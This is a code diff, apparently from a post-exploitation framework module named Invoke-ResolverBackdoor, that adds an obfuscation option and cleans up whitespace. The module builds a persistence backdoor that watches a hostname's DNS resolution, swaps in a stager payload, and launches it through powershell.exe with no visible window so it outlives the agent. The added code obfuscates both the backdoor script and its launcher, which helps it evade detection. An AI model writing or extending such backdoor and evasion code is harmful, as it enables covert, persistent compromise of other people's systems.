@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://sixdub.net'
             ]
@@ -79,7 +79,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Invoke-ResolverBackdoor
@@ -104,7 +104,7 @@ function Invoke-ResolverBackdoor
         {
             $running=$False
         }
-        
+
         try {
             $ips = [System.Net.Dns]::GetHostAddresses($Hostname)
             foreach ($addr in $ips)
@@ -146,7 +146,7 @@ Invoke-ResolverBackdoor"""
             else:
                 script = script.replace("REPLACE_LAUNCHER", stagerCode)
                 script = script.encode('ascii', 'ignore')
-        
+
         for option,values in self.options.iteritems():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                 if values['Value'] and values['Value'] != '':
@@ -154,8 +154,9 @@ Invoke-ResolverBackdoor"""
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
+                        script += " -" + str(option) + " " + str(values['Value'])
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         outFile = self.options['OutFile']['Value']
         if outFile != '':
             # make the base directory if it doesn't exist
@@ -168,14 +169,19 @@ Invoke-ResolverBackdoor"""
 
             print helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile)
             return ""
-        
+
         # transform the backdoor into something launched by powershell.exe
-        # so it survives the agent exiting  
-        launcher = helpers.powershell_launcher(script) 
+        # so it survives the agent exiting
+        launcher = helpers.powershell_launcher(script)
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        if obfuscate:
+            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
 
         return scriptLauncher
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
